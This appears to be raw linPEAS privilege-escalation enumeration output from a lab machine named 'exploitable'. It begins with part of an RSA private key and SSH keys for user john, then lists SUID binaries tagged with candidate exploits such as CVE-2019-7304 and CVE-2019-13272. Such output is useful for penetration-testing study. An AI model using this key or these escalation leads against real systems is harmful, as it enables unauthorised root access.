Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
-rw-r--r-- 1 john john 398 Feb  5  2020 /home/john/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0L6uy8/dauswKFLzOv885yA05aYITFZil1U39hC5TDIMTSbrH67y1ka/KoHYBOMaRAZkysgapmcNFCF9YMASZsGUy1lLKY/Aa/kFcCyopvhq3hPjq5aES6P04ZJO3Y5dBc/bO30BGFJX6/0c1c7Ju3N8bqkDEtzQnpZ3X4bhVyX1ED5VkulsY6dtchKGR8BmvFjva8t346BbwEKLET6X/575+wLrTFxD+hUXxr7Be6HJjqCDmdleSjzE/G8LeNQzETx4MyyJeYdnoxEemdDteylv65iDSn1fVKXeGmhSV9ck5aZy+H9neEhCeDzNauvc7zal7fvuWSmOqXwSt14N3 john@exploitable



-rw-rw-r-- 1 john john 398 Feb  5  2020 /home/john/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0L6uy8/dauswKFLzOv885yA05aYITFZil1U39hC5TDIMTSbrH67y1ka/KoHYBOMaRAZkysgapmcNFCF9YMASZsGUy1lLKY/Aa/kFcCyopvhq3hPjq5aES6P04ZJO3Y5dBc/bO30BGFJX6/0c1c7Ju3N8bqkDEtzQnpZ3X4bhVyX1ED5VkulsY6dtchKGR8BmvFjva8t346BbwEKLET6X/575+wLrTFxD+hUXxr7Be6HJjqCDmdleSjzE/G8LeNQzETx4MyyJeYdnoxEemdDteylv65iDSn1fVKXeGmhSV9ck5aZy+H9neEhCeDzNauvc7zal7fvuWSmOqXwSt14N3 john@exploitable

ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes

══╣ Possible private SSH keys were found!
/home/john/.ssh/id_rsa

══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem                                                                                                                                                                                                       
/snap/core/7270/etc/ssl/certs/ACCVRAIZ1.pem
/snap/core/7270/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/snap/core/7270/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/snap/core/7270/etc/ssl/certs/AddTrust_External_Root.pem
/snap/core/7270/etc/ssl/certs/AffirmTrust_Commercial.pem
/snap/core/7270/etc/ssl/certs/AffirmTrust_Networking.pem
/snap/core/7270/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/snap/core/7270/etc/ssl/certs/AffirmTrust_Premium.pem
/snap/core/7270/etc/ssl/certs/Amazon_Root_CA_1.pem
/snap/core/7270/etc/ssl/certs/Amazon_Root_CA_2.pem
/snap/core/7270/etc/ssl/certs/Amazon_Root_CA_3.pem
/snap/core/7270/etc/ssl/certs/Amazon_Root_CA_4.pem
/snap/core/7270/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/snap/core/7270/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/snap/core/7270/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/snap/core/7270/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/snap/core/7270/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/snap/core/7270/etc/ssl/certs/ca-certificates.crt
/snap/core/7270/etc/ssl/certs/CA_Disig_Root_R2.pem
1696PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                                                                                                              
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                                                                                            


Searching inside /etc/ssh/ssh_config for interesting info
Host *
   PasswordAuthentication no
   PubkeyAuthentication yes
   AuthorizedKeyFile    .ssh/authorized_keys
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb  5  2020 /etc/pam.d                                                                                                                                                                                         
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions                                                                                                                                                      
tmux 2.6                                                                                                                                                                                                                                    


/tmp/tmux-1000
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3517 Jan 15  2020 /etc/cloud/cloud.cfg                                                                                                                                                                               
     lock_passwd: True
-rw-r--r-- 1 root root 3612 May 15  2019 /snap/core/7270/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3612 Oct  4  2019 /snap/core/8268/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 121 Jun 21  2019 /snap/core/7270/usr/share/keyrings                                                                                                                                                                  
drwxr-xr-x 2 root root 121 Dec  6  2019 /snap/core/8268/usr/share/keyrings
drwxr-xr-x 2 root root 4096 Aug  5  2019 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                                                                                              
passwd file: /etc/passwd
passwd file: /snap/core/7270/etc/pam.d/passwd
passwd file: /snap/core/7270/etc/passwd
passwd file: /snap/core/7270/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/7270/var/lib/extrausers/passwd
passwd file: /snap/core/8268/etc/pam.d/passwd
passwd file: /snap/core/8268/etc/passwd
passwd file: /snap/core/8268/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/8268/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
-rw-r--r-- 1 root root 2796 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 13395 Jun 21  2019 /snap/core/7270/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /snap/core/7270/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /snap/core/7270/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /snap/core/7270/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 13395 Dec  6  2019 /snap/core/8268/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /snap/core/8268/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /snap/core/8268/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /snap/core/8268/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 3267 Jan 10  2019 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 john john 4096 Nov  5 02:34 /home/john/.gnupg

╔══════════╣ Analyzing Cache Vi Files (limit 70)
                                                                                                                                                                                                                                            
-rw------- 1 root root 12070 Jul 27  2020 /home/john/.viminfo


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/7270/usr/share/bash-completion/completions/postfix                                                                                                                                       

-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/8268/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                                                                                                                            

-rw-r--r-- 1 root root 69 Jan 13  2020 /etc/php/7.2/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Jan 13  2020 /usr/share/php7.2-common/common/ftp.ini






╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r----- 1 root adm 26560059 Nov  5 02:34 /var/log/apache2/access.log                                                                                                                                                                     

-rw-r----- 1 root adm 8106923 Nov  5 02:30 /var/log/apache2/error.log

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc                                                                                                                                                                                  
-rw-r--r-- 1 john john 3771 Apr  4  2018 /home/john/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/7270/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/8268/etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 john john 807 Apr  4  2018 /home/john/.profile
-rw-r--r-- 1 root root 655 May  9  2019 /snap/core/7270/etc/skel/.profile
-rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/8268/etc/skel/.profile



-rw-r--r-- 1 john john 0 Feb  5  2020 /home/john/.sudo_as_admin_successful



                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
strings Not Found                                                                                                                                                                                                                           
-rwsr-xr-x 1 root root 43K Jan  8  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                                     
-rwsr-xr-x 1 root root 27K Jan  8  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 107K Oct 30  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 146K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 40K Oct 10  2019 /snap/core/8268/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root root 27K Oct 10  2019 /snap/core/8268/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/8268/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/8268/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/8268/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Oct 11  2019 /snap/core/8268/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Jun 12  2018 /snap/core/8268/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 40K May 15  2019 /snap/core/7270/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/7270/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/7270/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/7270/bin/su
-rwsr-xr-x 1 root root 27K May 15  2019 /snap/core/7270/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/7270/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/7270/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/7270/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/7270/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/7270/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Jun 10  2019 /snap/core/7270/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 10  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Jun 12  2018 /snap/core/7270/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/pam_extrausers_chkpwd                                                                                                                                                                       
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/unix_chkpwd
-rwsr-sr-x 1 root root 107K Oct 30  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root tty 31K Jan  8  2020 /usr/bin/wall
-rwxr-sr-x 1 root ssh 355K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/8268/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/8268/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/8268/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/8268/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/8268/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/8268/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8268/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8268/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8268/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Mar  4  2019 /snap/core/8268/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Oct 10  2019 /snap/core/8268/usr/bin/wall
-rwsr-sr-x 1 root root 105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/7270/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/7270/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/7270/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/7270/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/7270/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/7270/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/7270/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/7270/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/7270/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Mar  4  2019 /snap/core/7270/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K May 15  2019 /snap/core/7270/usr/bin/wall
-rwsr-sr-x 1 root root 101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so                                                                                                                                                                    
/etc/ld.so.conf                                                                                                                                                                                                                             
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                                                                             
Current env capabilities:                                                                                                                                                                                                                   
Current: =
Current proc capabilities:
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                                                                             
                                                                                                                                                                                                                                            
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3194 Mar 26  2018 sbin.dhclient                                                                                                                                                                                     
-rw-r--r-- 1 root root   125 Nov 23  2018 usr.bin.lxc-start
-rw-r--r-- 1 root root  2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root 23936 Oct 30  2019 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1353 Mar 31  2018 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                                                                                                                     
files with acls in searched folders Not Found                                                                                                                                                                                               
                                                                                                                                                                                                                                            
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                                                                                                  
/usr/bin/gettext.sh                                                                                                                                                                                                                         

╔══════════╣ Executable files potentially added by user (limit 70)
2022-11-05+02:35:18.1511632140 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control                                                                                                                        
2022-11-05+02:35:18.1485030930 /var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
2022-11-05+02:35:18.1457235210 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
2022-11-05+02:35:18.1429994160 /var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
2022-11-05+02:35:18.1401527410 /var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
2022-11-05+02:35:18.1373488570 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
2022-11-05+02:35:18.1345594610 /var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
2022-11-05+02:35:18.1318667970 /var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
2022-11-05+02:35:18.1289794270 /var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
2022-11-05+02:35:18.1261339430 /var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
2022-11-05+02:35:18.1232718890 /var/lib/lxcfs/cgroup/memory/system.slice/lxd.service/cgroup.event_control
2022-11-05+02:35:18.1202548590 /var/lib/lxcfs/cgroup/memory/system.slice/snap-core-7270.mount/cgroup.event_control
2022-11-05+02:35:18.1174705720 /var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
2022-11-05+02:35:18.1146210610 /var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
2022-11-05+02:35:18.1115897220 /var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
2022-11-05+02:35:18.1089066060 /var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
2022-11-05+02:35:18.1060479160 /var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
2022-11-05+02:35:18.1031374500 /var/lib/lxcfs/cgroup/memory/system.slice/lxd.socket/cgroup.event_control
2022-11-05+02:35:18.1004848570 /var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
2022-11-05+02:35:18.0977035800 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
2022-11-05+02:35:18.0948823610 /var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
2022-11-05+02:35:18.0921674060 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
2022-11-05+02:35:18.0893821140 /var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
2022-11-05+02:35:18.0864132900 /var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
2022-11-05+02:35:18.0836353510 /var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
2022-11-05+02:35:18.0809458700 /var/lib/lxcfs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
2022-11-05+02:35:18.0780829680 /var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
2022-11-05+02:35:18.0750599850 /var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
2022-11-05+02:35:18.0722422390 /var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
2022-11-05+02:35:18.0693950270 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
2022-11-05+02:35:18.0666725830 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
2022-11-05+02:35:18.0601867080 /var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
2022-11-05+02:35:18.0572990640 /var/lib/lxcfs/cgroup/memory/system.slice/snap-core-8268.mount/cgroup.event_control
2022-11-05+02:35:18.0544165770 /var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
2022-11-05+02:35:18.0512549010 /var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
2022-11-05+02:35:18.0485172480 /var/lib/lxcfs/cgroup/memory/cgroup.event_control
2020-02-05+01:04:47.2062524650 /etc/network/if-up.d/mtuipv6
2020-02-05+01:04:47.2062524650 /etc/network/if-pre-up.d/mtuipv6

╔══════════╣ Unexpected in root
/initrd.img.old                                                                                                                                                                                                                             
/vmlinuz.old
/initrd.img
/vmlinuz
/swap.img

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                                                                                                           
total 36                                                                                                                                                                                                                                    
drwxr-xr-x  2 root root 4096 Feb  5  2020 .
drwxr-xr-x 93 root root 4096 Jul 27  2020 ..
-rw-r--r--  1 root root   96 Aug 19  2018 01-locale-fix.sh
-rw-r--r--  1 root root  825 Jun  5  2019 apps-bin-path.sh
-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--  1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x  1 root root  873 May 11  2019 Z99-cloudinit-warnings.sh
-rwxr-xr-x  1 root root 3417 May 11  2019 Z99-cloud-locale-test.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                                                                             
                                                                                                                                                                                                                                            
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                                                                                                
═╣ Credentials in fstab/mtab? ........... No                                                                                                                                                                                                
═╣ Can I read shadow files? ............. No                                                                                                                                                                                                
═╣ Can I read shadow plists? ............ No                                                                                                                                                                                                
═╣ Can I write shadow plists? ........... No                                                                                                                                                                                                
═╣ Can I read opasswd file? ............. No                                                                                                                                                                                                
═╣ Can I write in network-scripts? ...... No                                                                                                                                                                                                
═╣ Can I read root folder? .............. No                                                                                                                                                                                                
                                                                                                                                                                                                                                            
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                                                                      
/home/john/.vim
/home/john/.vim/.netrwhist
